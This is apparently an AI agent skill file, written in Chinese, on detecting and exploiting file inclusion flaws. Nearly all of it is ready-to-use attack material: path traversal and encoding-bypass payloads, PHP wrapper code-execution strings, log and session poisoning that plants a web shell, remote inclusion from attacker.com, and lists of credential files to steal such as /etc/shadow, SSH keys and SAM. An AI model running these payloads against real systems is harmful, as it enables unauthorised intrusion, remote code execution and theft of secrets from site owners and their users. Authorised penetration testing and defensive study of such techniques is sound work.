---
name: file-inclusion
description: 文件包含漏洞检测与利用。当目标存在文件读取、页面包含、模板加载、语言切换功能时使用。包括 LFI、RFI、路径遍历。
allowed-tools: Bash, Read, Write
---

# 文件包含 (File Inclusion)

通过操纵文件路径参数，读取服务器敏感文件或执行恶意代码。

## 常见指示器

- 文件参数（file=, page=, path=, template=, lang=, include=）
- 语言/主题切换功能
- 文档下载功能
- 图片/文件预览功能
- 模板加载功能
- 日志查看功能

## 检测方法

### 1. 基础测试

```bash
# 路径遍历
curl "http://target.com/page?file=../../../etc/passwd"
curl "http://target.com/page?file=....//....//....//etc/passwd"

# 绝对路径
curl "http://target.com/page?file=/etc/passwd"

# 空字节截断 (PHP < 5.3.4)
curl "http://target.com/page?file=../../../etc/passwd%00"
```

### 2. 协议测试

```bash
# PHP 伪协议
curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://target.com/page?file=php://input" -d "<?php system('id'); ?>"
```

## 攻击向量

### 本地文件包含 (LFI)

```bash
# 基础路径遍历
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# 绝对路径
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log

# Windows 路径
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
```

### 远程文件包含 (RFI)

```bash
# 基础 RFI
http://attacker.com/shell.txt
http://attacker.com/shell.txt?
http://attacker.com/shell.txt%00

# 数据 URI
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### PHP 伪协议

```bash
# 读取源码 (Base64)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php

# 代码执行
php://input
# POST: <?php system('id'); ?>

# 数据流
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 期望协议
expect://id
expect://ls

# ZIP 协议
zip://path/to/file.zip%23shell.php
phar://path/to/file.phar/shell.php
```

### 日志文件包含

```bash
# 1. 污染日志
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含日志
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"

# 常见日志路径
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log
/proc/self/fd/1
```

### Session 文件包含

```bash
# 1. 污染 session
# 在用户名等字段注入 PHP 代码

# 2. 包含 session 文件
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

### /proc 文件利用

```bash
# 环境变量
/proc/self/environ

# 命令行
/proc/self/cmdline

# 文件描述符
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2

# 内存映射
/proc/self/maps

# 当前工作目录
/proc/self/cwd/index.php
```

## 绕过技术

### 路径绕过

```bash
# 双写绕过
....//....//....//etc/passwd
..../\..../\..../\etc/passwd

# URL 编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

# Unicode 编码
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# 空字节截断 (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg
```

### 后缀绕过

```bash
# 空字节
../../../etc/passwd%00
../../../etc/passwd%00.php

# 路径截断 (长路径)
../../../etc/passwd/./././././[...]/./
../../../etc/passwd.....................[...]

# 问号截断
../../../etc/passwd?
../../../etc/passwd?.php
```

### 过滤绕过

```bash
# ../ 被过滤
....//
..../\
....\/
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c

# etc/passwd 被过滤
/etc/./passwd
/etc/passwd/.
/etc//passwd
/etc/passwd/
```

### 协议绕过

```bash
# http:// 被过滤
hTtP://attacker.com/shell.txt
HTTP://attacker.com/shell.txt
//attacker.com/shell.txt

# php:// 被过滤
PHP://filter/convert.base64-encode/resource=index.php
pHp://filter/convert.base64-encode/resource=index.php
```

## 敏感文件列表

### Linux

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.bash_history
/home/user/.ssh/id_rsa
/proc/version
/proc/cmdline
/proc/self/environ
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\Users\Administrator\.ssh\id_rsa
```

### Web 应用

```
# PHP
index.php
config.php
database.php
db.php
settings.php
.htaccess
.htpasswd
wp-config.php
configuration.php

# Java
WEB-INF/web.xml
WEB-INF/classes/
META-INF/MANIFEST.MF

# Python
settings.py
config.py
app.py
requirements.txt

# Node.js
package.json
.env
config.json
```

## LFI to RCE

### 方法 1: 日志污染

```bash
# 1. 注入 PHP 代码到 User-Agent
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含日志文件
curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"
```

### 方法 2: PHP 伪协议

```bash
# php://input
curl "http://target.com/page?file=php://input" -d "<?php system('id'); ?>"

# data://
curl "http://target.com/page?file=data://text/plain,<?php system('id'); ?>"
```

### 方法 3: Session 污染

```bash
# 1. 在 session 中注入代码
# 2. 包含 session 文件
curl "http://target.com/page?file=/tmp/sess_<PHPSESSID>&cmd=id"
```

### 方法 4: /proc/self/environ

```bash
# 1. 注入代码到 User-Agent
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# 2. 包含 environ
curl "http://target.com/page?file=/proc/self/environ&cmd=id"
```

### 方法 5: 文件上传 + LFI

```bash
# 1. 上传包含 PHP 代码的图片
# 2. 通过 LFI 包含上传的文件
curl "http://target.com/page?file=../uploads/shell.jpg"
```

## 最佳实践

1. 先测试基础路径遍历: `../../../etc/passwd`
2. 尝试不同编码和绕过技术
3. 测试 PHP 伪协议读取源码
4. 尝试 LFI to RCE（日志污染、php://input）
5. 检查是否支持 RFI
6. 枚举敏感文件（配置文件、密钥、日志）
7. 分析源码寻找更多漏洞
